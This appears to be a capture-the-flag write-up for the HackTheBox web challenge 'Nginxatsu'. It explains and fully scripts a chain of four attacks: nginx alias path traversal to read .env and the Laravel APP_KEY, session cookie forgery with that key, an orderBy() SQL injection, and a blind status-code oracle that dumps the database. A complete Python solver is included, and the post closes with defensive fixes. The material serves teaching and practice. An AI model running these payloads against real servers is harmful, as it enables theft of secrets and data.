---
title: "Nginxatsu"
date: 2027-12-19 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, nginx, off-by-slash, path-traversal, laravel, app-key, cookie-forgery, sql-injection, blind-sqli, cwe-22, cwe-89, cwe-321]
description: "A medium Web challenge chaining four small misconfigurations: an nginx off-by-slash alias traversal leaks Laravel's APP_KEY, that key lets you forge the entire session cookie, the forged session smuggles a payload into an unescaped orderBy() JSON path, and a 500-vs-200 status flip turns it into a blind SQL injection that dumps the flag."
---

## Overview

`Nginxatsu` is a medium HackTheBox **Web** challenge — a Laravel 5.8.10 app served
behind nginx that lets you generate nginx config files. Getting the flag is a
four-link chain where each link only exists because of one small mistake: an
nginx [off-by-slash alias traversal](https://cwe.mitre.org/data/definitions/22.html)
leaks the app's `.env` (including Laravel's `APP_KEY`), the leaked key lets you
forge the whole session cookie, the forged session carries an injected sort
column into an unescaped `orderBy()`, and with debug mode off the HTTP status
code flips 500↔200 to give you a blind [SQL injection](https://cwe.mitre.org/data/definitions/89.html)
oracle that dumps the flag.

## The technique

### 1. Nginx off-by-slash → source & secret disclosure

The static assets are served with an nginx block like
`location /assets { alias /www/app/public/static/; }`. The **location has no
trailing slash but the alias does** — so a request to `/assets../` is joined onto
the alias and the `..` resolves *upward*, escaping the intended directory. That
turns the asset route into an arbitrary file read of the application root:

```bash
curl -s "http://<target>/assets../.env"
curl -s "http://<target>/assets../app/Http/Controllers/API/ConfigController.php"
curl -s "http://<target>/assets../routes/api.php"
```

`.env` hands over `APP_KEY`, the DB credentials, and `DB_DATABASE=nginxatsu`. The
source reveals the real vulnerability in `ConfigController@index`:

```php
return NginxConfig::query()
    ->where('user', Session::get('username'))
    ->orderBy(Session::get('order', 'id'), Session::get('direction', 'desc'))
    ->get();
```

The sort column comes straight from the session. A separate route
(`MainController@edit`) *does* whitelist the column to `id`/`created_at`/`updated_at`
— but that only guards the legitimate way of setting it.

### 2. Forge the session cookie with the leaked APP_KEY

Laravel's `APP_KEY` both encrypts *and* authenticates every cookie
([CWE-321](https://cwe.mitre.org/data/definitions/321.html) — reliance on a
secret that is now public). With `SESSION_DRIVER=cookie` the entire session lives
client-side, so with the key we forge it outright and bypass the whitelist. In
Laravel 5.8 the encrypter is AES-256-CBC with an `HMAC-SHA256(iv_b64 + value_b64,
key)` tag, `serialize=false` for cookies, and **no `CookieValuePrefix`** (that
arrived in 6.x). Two cookies make up the session:

- `nginxatsu_session` = `encrypt(<session_id>)`
- a cookie **named** `<session_id>` = `encrypt(json({"data": serialize(attrs), "expires": ts}))`

We build both from scratch, setting `username` and a malicious `order`.

### 3. orderBy() JSON-path SQL injection (Laravel < 5.8.11)

The query builder escapes `where()` *values* but not the column *identifier*
passed to `orderBy()`. A column containing `->` is routed to `wrapJsonPath` →
`json_unquote(json_extract(\`id\`, '$."<path>"'))`, and in Laravel **before
5.8.11 that path is not escaped**. So a session `order` of:

```
id->x"')) , (<injected sql>) -- -
```

breaks out of `json_extract(\`id\`, '$."x"')` and appends a second ORDER BY
expression carrying arbitrary SQL.

### 4. Boolean oracle from the HTTP status

`APP_DEBUG=false` hides the SQL error text, but the status code still flips: a
valid query returns **200**, a SQL error returns **500**. That is a perfect
one-bit oracle:

```
SELECT IF((<condition>), 1, (SELECT 1 UNION SELECT 2))
```

When the condition is true it yields `1` (200); when false the two-row subquery
is used as a scalar and MySQL errors (500).

## Solution

Two gotchas make this look broken while it is actually fine:

- **The APP_KEY is regenerated on every container boot.** A key cached from one
  instance silently fails the cookie MAC on the next, so the forged session is
  ignored and you fall back to a fresh guest. The solver re-reads `.env` from the
  live target on every run.
- **MySQL skips ORDER BY entirely on a zero-row result set.** A guest owns no
  configs, so the injected expression never evaluates and *every* payload returns
  200. The fix is to `POST /api/configs` first to seed one row owned by the forged
  username, which forces ORDER BY to run.

The flag lives in a table `definitely_not_a_flaaag` under a randomised column name
(`flag_XXXXX`), found via `information_schema.columns`. The full self-contained
solver reads the live key, forges the session, seeds a row, and binary-searches
the flag through the 200/500 oracle:

Create `solve.py`:

```python
#!/usr/bin/env python3
# HTB nginxatsu — full self-contained solver.
import sys, json, time, base64, hashlib, hmac, os, requests
from Crypto.Cipher import AES

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:1337"
BASE = f"http://{TARGET}"
USER = "pwned"                                          # forged session username (owns the row)
SIDV = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"       # arbitrary 40-char session id

def read_app_key():                                     # leak the live per-boot APP_KEY
    env = requests.get(f"{BASE}/assets../.env", timeout=15).text
    for line in env.splitlines():
        if line.startswith("APP_KEY=base64:"):
            return base64.b64decode(line.split("base64:", 1)[1].strip())
    raise RuntimeError("APP_KEY not found via traversal")

KEY = read_app_key()

def _pad(b): p = 16 - len(b) % 16; return b + bytes([p]) * p

def encrypt(pt: bytes) -> str:                          # Laravel Encrypter (serialize=false)
    iv = os.urandom(16)
    ct = AES.new(KEY, AES.MODE_CBC, iv).encrypt(_pad(pt))
    iv_b64 = base64.b64encode(iv).decode()
    val_b64 = base64.b64encode(ct).decode()
    mac = hmac.new(KEY, (iv_b64 + val_b64).encode(), hashlib.sha256).hexdigest()
    j = json.dumps({"iv": iv_b64, "value": val_b64, "mac": mac}, separators=(",", ":"))
    return base64.b64encode(j.encode()).decode()

def session_cookies(order_val):                         # forge both cookies from scratch
    o = order_val.encode(); u = USER.encode()
    attrs = (b'a:4:{'
        b's:6:"_token";s:40:"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";'
        b's:8:"username";s:' + str(len(u)).encode() + b':"' + u + b'";'
        b's:5:"order";s:' + str(len(o)).encode() + b':"' + o + b'";'
        b's:9:"direction";s:4:"desc";}')
    data = json.dumps({"data": attrs.decode('latin1'), "expires": 1893456000},
                      separators=(",", ":")).encode('latin1')
    return {"nginxatsu_session": encrypt(SIDV.encode()), SIDV: encrypt(data)}

def get_configs(order_val):
    for _ in range(8):
        try:
            return requests.get(f"{BASE}/api/configs", cookies=session_cookies(order_val), timeout=15)
        except requests.exceptions.RequestException:
            time.sleep(1.5)
    raise RuntimeError("target unreachable")

def create_row():                                       # seed a row so ORDER BY evaluates
    body = {"server": {"user": "nginx", "name": "x"},
            "routes": [{"location": "/", "directive": "return 200"}]}
    return requests.post(f"{BASE}/api/configs", cookies=session_cookies("id"),
                         json=body, timeout=15).status_code

def oracle(cond):                                       # true -> 200, false -> SQL error -> 500
    inject = f"SELECT IF(({cond}), 1, (SELECT 1 UNION SELECT 2))"
    order = f'id->x"\')) , ({inject}) -- -'
    return get_configs(order).status_code == 200

def extract(expr, maxlen=64):
    out = ""
    while len(out) < maxlen:
        i = len(out) + 1
        if not oracle(f"ASCII(SUBSTRING(({expr}),{i},1)) > 0"):
            break
        lo, hi = 0, 127
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ASCII(SUBSTRING(({expr}),{i},1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid
        out += chr(lo); sys.stdout.write(chr(lo)); sys.stdout.flush()
    print()
    return out

if __name__ == "__main__":
    print("[*] create row:", create_row())
    print("[*] oracle: 1=1 =", oracle("1=1"), "| 1=2 =", oracle("1=2"))
    flagcol = extract("SELECT column_name FROM information_schema.columns "
                      "WHERE table_schema=database() AND column_name LIKE 0x666c61675f25 LIMIT 1", 40)
    print("[*] flag column:", flagcol)
    print("[+] FLAG:", extract(f"SELECT `{flagcol}` FROM definitely_not_a_flaaag LIMIT 1", 80))
```

Run it against the instance:

```bash
python3 solve.py <target-host>:<port>
```

```
[*] create row: 200
[*] oracle: 1=1 = True | 1=2 = False
flag_XXXXX
[*] flag column: flag_XXXXX
HTB{...}
```

## Why it worked

Four independent misconfigurations lined up: an nginx `location` without a
trailing slash exposed the source and secrets; a leaked `APP_KEY` made every
cookie forgeable, defeating the server-side column whitelist because the value
was stored in a client cookie; Laravel < 5.8.11 didn't escape the JSON path in
`orderBy()`, so the forged sort column became raw SQL; and `APP_DEBUG=false`
still leaked one bit of information per request through the HTTP status code. The
whitelist looked like a defence but only guarded the *intended* path to setting
the value — the underlying trust of a client-controlled, forgeable session was
the real flaw.

## Fix / defense

- **nginx:** put a trailing slash on **both** the location and the alias —
  `location /assets/ { alias /www/app/public/static/; }` — or prefer `root` over
  `alias`. Keep the app root and `.env` outside any web-served directory.
- **Secrets:** never expose `.env`/`APP_KEY`; rotate immediately if it leaks and
  treat the leak as a full compromise. Do not trust session-stored values as if
  they were server-validated.
- **SQL:** never pass user input to `orderBy()`; map the sort key through a
  server-side allow-list of real column names, and upgrade to Laravel ≥ 5.8.11
  (which escapes the JSON path).
